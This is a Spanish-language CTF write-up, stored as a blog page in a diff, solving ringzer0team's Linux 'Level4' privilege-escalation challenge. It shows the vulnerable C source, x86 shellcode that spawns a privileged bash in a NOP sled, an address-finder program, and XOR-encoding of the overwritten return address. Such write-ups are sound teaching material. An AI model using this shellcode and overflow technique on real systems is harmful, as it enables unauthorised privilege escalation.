@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Level4 Pwned! - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="&nbsp;by [Q]3rV[0]Últimamente le estuve dedicando tiempo al CTF de&nbsp;ringzer0team que cuenta con una extensa lista de retos de todo tipo: &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/02/18/level4-pwned/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Level4 Pwned!</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-18T14:30:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:30 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/DAy7Arn.jpg?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/DAy7Arn.jpg?1" height="180" width="320" />&nbsp;</a></div><br /><div style="text-align: right;"><b>by [Q]3rV[0]</b></div><br />Últimamente le estuve dedicando tiempo al CTF de&nbsp;<a href="http://ringzer0team.com/">ringzer0team</a> que cuenta con una extensa lista de retos de todo tipo: <b>Exploiting, Informática forense, web,</b><br /><a name='more'></a><b> Cracking, Escalacion de privilegios en linux, Criptografia, Javascript,Inyecciones SQL</b>, etc.<br />&nbsp;Como consejo los invito a que se pasen por la web y le den masa a muchos de los desafíos que existen, ya que además de pasar un buen rato,&nbsp; se pueden llevar a casa unos buenos <b>skills</b> mejorados en el ámbito de la seguridad.<br /><br />El ultimo reto que realice tiene por nombre <b>"Level4 Pwnage Linux Level Up"</b>, esta dentro de una serie de desafíos de exploiting en linux en el que tendremos que ir rebalsando el vaso para ir ganando privilegios, comenzando por supuesto a partir del primer nivel.<br /><br /><br /><h2 style="text-align: center;">Level4 </h2><br />&nbsp;Una vez dentro, en el directorio <b>/levels</b> encontramos el binario level4 con su respectivo source, antes que nada vamos a ver como reacciona al pasaje de argumentos. Aclaro que <b>ASLR esta a 0</b> en el servidor y los binarios no presentan ninguna protección como <b>NX, CANARY</b>, etc.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><br />Ok, ingreso una <b>A</b> como argumento y recibo una salida diferente tras cada ejecución, vamos a ver si podemos tocar el <b>EIP</b>.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" /></a></div><br />Logramos sobrescribir <b>EIP</b>, pero aparentemente se pinta con un valor diferente a A, ahora si creo que es momento de pispear el source para ver que anda pasando.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br />En esta función es donde se da el <b>truco</b>.<br /><br /><br /><pre class="brush: c">void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /></pre><br />Lo que sucede es que cada carácter que es ingresado al buffer sufre una operación <b>XOR de su equivalente en ASCII</b>, pero&nbsp; como vemos la variable <b>key</b> almacena valores aleatorios mediante la función <b>rand()</b> por lo que en cada ejecución la cadena que le pasemos va a presentar un output diferente o no, si es que la key se vuelve a repetir.<br /><br />Analicemos un poco que es lo que hace el operador <b>^ </b>(XOR)<br /><br /><br /><h2 style="text-align: center;">XOR btwise&nbsp; </h2><div style="text-align: left;"><br /><b>XOR</b> es un operador que <b>trabaja a nivel de bits</b>, su función es simple, toma dos enteros y arroja una salida.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Supongamos que tenemos la siguiente linea.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><h3><b>26 ^ 30</b></h3></div><div style="text-align: left;"><br /></div><b>XOR</b> tomara ambos valores en binario y devolverá un 0 si ambos pares son iguales o 1 si son diferentes.<br /><br /><h3>26&nbsp;&nbsp; =&nbsp;&nbsp; 11010</h3><h3>30&nbsp;&nbsp; =&nbsp;&nbsp; 11110</h3><h3>out =&nbsp;&nbsp; 00100&nbsp; =&nbsp; 4 </h3><br />Entonces si realizo la siguiente operación<br /><br /><h3><b>4 ^ 30</b></h3><br />El resultado seria <b>26</b><br /><br />Comprendiendo ahora como trabaja <b>XOR</b> podemos codificar la dirección de memoria que sobrescribirá <b>EIP</b>, con un valor determinado y <b>esperar a que este se repita para que se produzca la decodificación</b>.<br /><br /><br /><br /><h2 style="text-align: center;">&nbsp;Forjando el exploit </h2><div class="separator" style="clear: both; text-align: center;"></div><br />En el server opte por almacenar el <b>NOPSLED+SHELLCODE</b> dentro de una variable de entorno y luego obtener la dirección en memoria de dicha variable con la que invadiremos el <b>EIP</b>.<br /><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ export SHELLCODE=$(python -c 'print "\x90"*200+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')<br /></pre><br />La ubicación de <b>SHELLCODE</b> podemos divisarla con el siguiente programita en c.<br /><br /><br /><pre class="brush: c">#include &lt;stdlib.h&gt;<br /><br />int main()<br />{<br />    char *addr;<br />    addr = getenv("SHELLCODE");<br />    printf("SHELLCODE is at %p\n", addr);<br />    exit(0);<br />}<br /><br /></pre><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ /var/tmp/./findvar<br />SHELLCODE is at 0xbffff876<br /></pre><br />Una vez que obtenemos la dirección la codificamos a&nbsp; <b>XOR ^ 47 </b><br /><br /><br />Para no tener que andar codeando nada nuevo,&nbsp; simplemente aproveche el source del binario y le deje el valor de la variable <b>key</b> fijo en <b>47</b>, que es el entero que usaremos para codificar nuestra dirección y con suerte esperemos que se repita enseguida.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    char key = (unsigned char)(47);<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br /><br />Lo compilamos en local<br /><br /><br /><pre class="brush: bash">gcc -o xorencode -fno-stack-protector -mpreferred-stack-boundary=2 level4xor.c<br /></pre><br /><br />Y codificamos <b>0xbffff876</b><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><b><a href="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" /></a></b></div><br /><br />Por lógica si volviéramos a codificar <b>0x59d7d090</b> el valor tendría que ser igual a <b>0xbffff876</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" /></a></div><br />Solo resta armar el exploit y darle a mano hasta que la key obtenga el valor <b>47</b> cosa que no es imposible pero puede llevarnos algún tiempito o no, <b>dependera de la suerte con la que corramos!</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" /></a></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" /></a></div><br /><h2 style="text-align: center;">Dos dias despues...</h2><div style="text-align: left;"><br /></div><div style="text-align: left;">No, es joda! XD, luego de media hora intentando el exploit termino por tirarme el prompt de la victoria, el <b>EIP</b> por fin se tiño con la dirección donde se hallaba nuestro <b>shellcode</b> y pude tomar el <b>setuid</b> de level5!.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Y se preguntaran por que no programe un script que me automatice el trabajo??...<b>sangre sudor y gloria es mi respuesta</b>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-02-18T14:30:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:30 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/02/18/level4-pwned/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/02/18/level4-pwned/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/02/07/programa-tu-modulo-para-frameshock/" title="Previous Post: Programa tu modulo para Frameshock">&laquo; Programa tu modulo para Frameshock</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/02/26/enfoqueseguro-frameshock/" title="Next Post: Enfoqueseguro - Frameshock ">Enfoqueseguro - Frameshock  &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
